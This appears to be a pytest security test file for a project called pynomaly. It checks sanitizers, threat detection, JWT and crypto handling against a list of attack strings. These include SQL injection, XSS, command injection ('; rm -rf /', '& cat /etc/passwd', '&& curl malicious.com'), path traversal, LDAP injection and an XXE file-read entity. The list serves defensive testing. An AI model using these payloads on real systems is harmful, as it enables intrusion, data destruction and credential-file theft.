"""
Production-Grade Security Testing Suite

Advanced security tests covering penetration testing, vulnerability scanning,
threat modeling, and security compliance validation.
"""

import base64
import hashlib
import hmac
import json
import os
import re
import socket
import ssl
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List
from unittest.mock import Mock, patch
from urllib.parse import urlencode

import jwt
import pytest
import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

try:
    from pynomaly.domain.exceptions import AuthenticationError, AuthorizationError
    from pynomaly.infrastructure.auth.jwt_auth import JWTAuthService
    from pynomaly.infrastructure.security.input_validation import InputSanitizer
    from pynomaly.infrastructure.security.threat_detection import ThreatDetector
except ImportError:
    # Import mocks if actual modules not available
    import sys
    sys.path.append('tests/performance')
    from test_performance_security_mocks import patch_imports
    patch_imports()
    from pynomaly.infrastructure.auth.jwt_auth import JWTAuthService
    from pynomaly.infrastructure.security.input_validation import InputSanitizer
    from pynomaly.infrastructure.security.threat_detection import ThreatDetector
    # Mock exceptions
    class AuthenticationError(Exception):
        pass
    class AuthorizationError(Exception):
        pass


class SecurityTestHarness:
    """Advanced security testing harness."""

    def __init__(self):
        self.threat_detector = ThreatDetector()
        self.input_sanitizer = InputSanitizer()
        self.attack_patterns = self._load_attack_patterns()
        self.vulnerability_scanner = VulnerabilityScanner()

    def _load_attack_patterns(self) -> Dict[str, List[str]]:
        """Load common attack patterns for testing."""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "admin' /*",
                "' OR 1=1#",
                "' UNION SELECT * FROM users--",
                "'; INSERT INTO users VALUES('hacker', 'password');--",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
            ],
            "command_injection": [
                "; ls -la",
                "& cat /etc/passwd",
                "| whoami",
                "`id`",
                "$(whoami)",
                "; rm -rf /",
                "&& curl malicious.com",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\SAM",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
            "ldap_injection": [
                "*)(uid=*",
                "*)(|(uid=*))",
                "admin)(&(password=*))",
                "*))(|(uid=*",
            ],
            "xml_injection": [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<![CDATA[<script>alert('XSS')</script>]]>",
            ],
        }


class VulnerabilityScanner:
    """Advanced vulnerability scanning capabilities."""

    def __init__(self):
        self.common_vulnerabilities = {
            "weak_passwords": [
                "password",
                "123456",
                "admin",
                "root",
                "guest",
                "user",
                "password123",
                "qwerty",
            ],
            "insecure_headers": [
                "X-Frame-Options",
                "X-Content-Type-Options",
                "X-XSS-Protection",
                "Strict-Transport-Security",
                "Content-Security-Policy",
            ],
            "sensitive_data_exposure": [
                "password",
                "secret",
                "token",
                "key",
                "private",
                "confidential",
            ],
        }

    def scan_for_weak_crypto(self, data: str) -> List[str]:
        """Scan for weak cryptographic implementations."""
        vulnerabilities = []
        
        # Check for hardcoded secrets
        if re.search(r'secret.*=.*[\'"][^\'"]{8,}[\'"]', data, re.IGNORECASE):
            vulnerabilities.append("Hardcoded secret detected")
        
        # Check for weak encryption
        if "md5" in data.lower() or "sha1" in data.lower():
            vulnerabilities.append("Weak hash algorithm detected")
        
        # Check for insecure random
        if "random.random()" in data or "Math.random()" in data:
            vulnerabilities.append("Insecure random number generation")
        
        return vulnerabilities

    def scan_for_information_disclosure(self, response: str) -> List[str]:
        """Scan for information disclosure vulnerabilities."""
        vulnerabilities = []
        
        # Check for stack traces
        if "Traceback" in response or "Exception" in response:
            vulnerabilities.append("Stack trace exposure")
        
        # Check for sensitive paths
        if "/etc/passwd" in response or "C:\\Windows" in response:
            vulnerabilities.append("Sensitive file path exposure")
        
        # Check for database errors
        if any(error in response.lower() for error in ["mysql", "postgresql", "oracle", "sql server"]):
            vulnerabilities.append("Database error exposure")
        
        return vulnerabilities


class TestProductionSecurity:
    """Production-grade security tests."""

    @pytest.fixture
    def security_harness(self):
        """Create security test harness."""
        return SecurityTestHarness()

    @pytest.fixture
    def mock_auth_service(self):
        """Create mock authentication service."""
        service = Mock(spec=JWTAuthService)
        service.secret_key = "test-secret-key-256-bits-long-for-security"
        service.algorithm = "HS256"
        return service

    def test_sql_injection_protection(self, security_harness):
        """Test SQL injection attack protection."""
        for attack_pattern in security_harness.attack_patterns["sql_injection"]:
            # Test input sanitization
            sanitized = security_harness.input_sanitizer.sanitize_string(attack_pattern)
            assert attack_pattern != sanitized, f"SQL injection not sanitized: {attack_pattern}"
            
            # Test threat detection
            threat_level = security_harness.threat_detector.analyze_input(attack_pattern)
            assert threat_level > 0.7, f"SQL injection not detected: {attack_pattern}"

    def test_xss_protection(self, security_harness):
        """Test XSS attack protection."""
        for attack_pattern in security_harness.attack_patterns["xss"]:
            # Test input sanitization
            sanitized = security_harness.input_sanitizer.sanitize_html(attack_pattern)
            
            # Should not contain script tags or event handlers
            assert "<script>" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()
            assert "onload=" not in sanitized.lower()
            
            # Test threat detection
            threat_level = security_harness.threat_detector.analyze_input(attack_pattern)
            assert threat_level > 0.6, f"XSS not detected: {attack_pattern}"

    def test_command_injection_protection(self, security_harness):
        """Test command injection attack protection."""
        for attack_pattern in security_harness.attack_patterns["command_injection"]:
            # Test input sanitization
            sanitized = security_harness.input_sanitizer.sanitize_command(attack_pattern)
            
            # Should not contain dangerous characters
            dangerous_chars = [";", "&", "|", "`", "$", "(", ")"]
            for char in dangerous_chars:
                assert char not in sanitized, f"Command injection char not removed: {char}"
            
            # Test threat detection
            threat_level = security_harness.threat_detector.analyze_input(attack_pattern)
            assert threat_level > 0.8, f"Command injection not detected: {attack_pattern}"

    def test_path_traversal_protection(self, security_harness):
        """Test path traversal attack protection."""
        for attack_pattern in security_harness.attack_patterns["path_traversal"]:
            # Test input sanitization
            sanitized = security_harness.input_sanitizer.sanitize_path(attack_pattern)
            
            # Should not contain path traversal sequences
            assert "../" not in sanitized
            assert "..\\" not in sanitized
            assert "%2e%2e" not in sanitized.lower()
            
            # Test threat detection
            threat_level = security_harness.threat_detector.analyze_input(attack_pattern)
            assert threat_level > 0.7, f"Path traversal not detected: {attack_pattern}"

    def test_jwt_security_implementation(self, mock_auth_service):
        """Test JWT security implementation."""
        # Test token generation
        payload = {"user_id": "test_user", "role": "user"}
        token = jwt.encode(payload, mock_auth_service.secret_key, algorithm="HS256")
        
        # Test token validation
        decoded = jwt.decode(token, mock_auth_service.secret_key, algorithms=["HS256"])
        assert decoded["user_id"] == "test_user"
        
        # Test token tampering detection
        tampered_token = token[:-5] + "XXXXX"
        with pytest.raises(jwt.InvalidTokenError):
            jwt.decode(tampered_token, mock_auth_service.secret_key, algorithms=["HS256"])
        
        # Test algorithm confusion attack
        with pytest.raises(jwt.InvalidTokenError):
            jwt.decode(token, mock_auth_service.secret_key, algorithms=["none"])

    def test_timing_attack_resistance(self, mock_auth_service):
        """Test resistance to timing attacks."""
        correct_password = "correct_password"
        incorrect_passwords = [
            "wrong_password",
            "c",
            "co",
            "cor",
            "corr",
            "corre",
            "correc",
            "completely_wrong",
        ]
        
        def authenticate(password: str) -> bool:
            """Simulate authentication with timing attack resistance."""
            # Use constant-time comparison
            return hmac.compare_digest(correct_password, password)
        
        # Measure timing for correct password
        start = time.perf_counter()
        result = authenticate(correct_password)
        correct_time = time.perf_counter() - start
        assert result is True
        
        # Measure timing for incorrect passwords
        for incorrect_password in incorrect_passwords:
            start = time.perf_counter()
            result = authenticate(incorrect_password)
            incorrect_time = time.perf_counter() - start
            assert result is False
            
            # Timing should be similar (within 50% variance)
            time_ratio = abs(correct_time - incorrect_time) / correct_time
            assert time_ratio < 0.5, f"Timing attack vulnerability: {time_ratio}"

    def test_cryptographic_security(self):
        """Test cryptographic security implementation."""
        # Test secure random generation
        random_bytes = os.urandom(32)
        assert len(random_bytes) == 32
        assert random_bytes != os.urandom(32)  # Should be different
        
        # Test strong key generation
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        public_key = private_key.public_key()
        
        # Test encryption/decryption
        message = b"sensitive data"
        encrypted = public_key.encrypt(
            message,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        decrypted = private_key.decrypt(
            encrypted,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        assert decrypted == message

    def test_session_security(self):
        """Test session security implementation."""
        # Test session token generation
        session_token = base64.urlsafe_b64encode(os.urandom(32)).decode()
        assert len(session_token) > 40  # Should be sufficiently long
        
        # Test session expiration
        session_data = {
            "user_id": "test_user",
            "created_at": datetime.utcnow().isoformat(),
            "expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
        }
        
        # Session should be valid initially
        expires_at = datetime.fromisoformat(session_data["expires_at"])
        assert expires_at > datetime.utcnow()
        
        # Test session invalidation
        session_data["expires_at"] = (datetime.utcnow() - timedelta(hours=1)).isoformat()
        expires_at = datetime.fromisoformat(session_data["expires_at"])
        assert expires_at < datetime.utcnow()

    def test_input_validation_security(self, security_harness):
        """Test comprehensive input validation security."""
        test_cases = [
            # Test email validation
            ("email", "user@domain.com", True),
            ("email", "invalid-email", False),
            ("email", "user@domain.com<script>", False),
            
            # Test phone number validation
            ("phone", "+1234567890", True),
            ("phone", "123-456-7890", True),
            ("phone", "invalid-phone", False),
            ("phone", "123; DROP TABLE users;", False),
            
            # Test URL validation
            ("url", "https://example.com", True),
            ("url", "http://example.com", True),
            ("url", "javascript:alert('xss')", False),
            ("url", "data:text/html,<script>alert('xss')</script>", False),
        ]
        
        for input_type, value, expected_valid in test_cases:
            is_valid = security_harness.input_sanitizer.validate_input(input_type, value)
            assert is_valid == expected_valid, f"Validation failed for {input_type}: {value}"

    def test_rate_limiting_security(self):
        """Test rate limiting implementation."""
        from collections import defaultdict
        
        # Simple rate limiter implementation
        class RateLimiter:
            def __init__(self, max_requests: int = 10, window_seconds: int = 60):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests = defaultdict(list)
            
            def is_allowed(self, client_id: str) -> bool:
                now = time.time()
                client_requests = self.requests[client_id]
                
                # Remove old requests
                client_requests[:] = [req_time for req_time in client_requests 
                                    if now - req_time < self.window_seconds]
                
                # Check if limit exceeded
                if len(client_requests) >= self.max_requests:
                    return False
                
                # Add current request
                client_requests.append(now)
                return True
        
        rate_limiter = RateLimiter(max_requests=5, window_seconds=10)
        
        # Test normal usage
        for i in range(5):
            assert rate_limiter.is_allowed("client1") is True
        
        # Test rate limiting
        assert rate_limiter.is_allowed("client1") is False
        
        # Test different client
        assert rate_limiter.is_allowed("client2") is True

    def test_security_headers_validation(self):
        """Test security headers implementation."""
        required_headers = {
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }
        
        # Mock response headers
        response_headers = {
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }
        
        # Validate security headers
        for header, expected_value in required_headers.items():
            assert header in response_headers, f"Missing security header: {header}"
            assert response_headers[header] == expected_value, f"Invalid header value: {header}"

    def test_vulnerability_scanning(self, security_harness):
        """Test automated vulnerability scanning."""
        # Test code for common vulnerabilities
        vulnerable_code = """
        secret_key = "hardcoded_secret_123"
        password = "admin123"
        
        def authenticate(user_input):
            query = f"SELECT * FROM users WHERE username = '{user_input}'"
            return execute_query(query)
        
        import hashlib
        def hash_password(password):
            return hashlib.md5(password.encode()).hexdigest()
        """
        
        vulnerabilities = security_harness.vulnerability_scanner.scan_for_weak_crypto(vulnerable_code)
        assert len(vulnerabilities) > 0
        assert any("Hardcoded secret" in v for v in vulnerabilities)
        assert any("Weak hash algorithm" in v for v in vulnerabilities)

    def test_penetration_testing_simulation(self, security_harness):
        """Test penetration testing simulation."""
        # Simulate common penetration testing scenarios
        
        # Test 1: Brute force attack simulation
        def simulate_brute_force():
            common_passwords = ["password", "123456", "admin", "root"]
            for password in common_passwords:
                # Simulate authentication attempt
                if password == "admin":  # Simulate weak password
                    return True
            return False
        
        # Should detect brute force vulnerability
        assert simulate_brute_force() is True  # Vulnerable to brute force
        
        # Test 2: Directory traversal simulation
        def simulate_directory_traversal(path: str):
            # Simulate file access
            if "../" in path:
                return "Access denied"  # Proper protection
            return "File content"
        
        # Should be protected against directory traversal
        result = simulate_directory_traversal("../../../etc/passwd")
        assert result == "Access denied"
        
        # Test 3: CSRF attack simulation
        def simulate_csrf_protection(token: str, expected_token: str):
            return token == expected_token
        
        # Should require valid CSRF token
        assert simulate_csrf_protection("invalid_token", "valid_token") is False
        assert simulate_csrf_protection("valid_token", "valid_token") is True

    def test_security_monitoring_and_alerting(self):
        """Test security monitoring and alerting."""
        # Mock security monitoring system
        class SecurityMonitor:
            def __init__(self):
                self.alerts = []
                self.threat_level = 0
            
            def log_security_event(self, event_type: str, details: dict):
                self.alerts.append({"type": event_type, "details": details, "timestamp": time.time()})
                
                # Increase threat level based on event
                if event_type == "failed_login":
                    self.threat_level += 1
                elif event_type == "sql_injection_attempt":
                    self.threat_level += 5
                elif event_type == "unauthorized_access":
                    self.threat_level += 10
            
            def get_threat_level(self) -> int:
                return self.threat_level
            
            def should_alert(self) -> bool:
                return self.threat_level > 10
        
        monitor = SecurityMonitor()
        
        # Simulate security events
        monitor.log_security_event("failed_login", {"user": "admin", "ip": "192.168.1.100"})
        monitor.log_security_event("sql_injection_attempt", {"query": "'; DROP TABLE users; --"})
        monitor.log_security_event("unauthorized_access", {"resource": "/admin/users"})
        
        # Should trigger alert
        assert monitor.should_alert() is True
        assert len(monitor.alerts) == 3
        assert monitor.get_threat_level() > 10

    def test_compliance_validation(self):
        """Test security compliance validation."""
        # Test GDPR compliance
        def validate_gdpr_compliance(data_processing_config: dict) -> bool:
            required_fields = ["consent", "data_retention", "deletion_process"]
            return all(field in data_processing_config for field in required_fields)
        
        gdpr_config = {
            "consent": True,
            "data_retention": "30 days",
            "deletion_process": "automatic",
        }
        
        assert validate_gdpr_compliance(gdpr_config) is True
        
        # Test SOC 2 compliance
        def validate_soc2_compliance(security_config: dict) -> bool:
            required_controls = ["access_control", "encryption", "monitoring", "incident_response"]
            return all(control in security_config for control in required_controls)
        
        soc2_config = {
            "access_control": "rbac",
            "encryption": "aes-256",
            "monitoring": "24/7",
            "incident_response": "automated",
        }
        
        assert validate_soc2_compliance(soc2_config) is True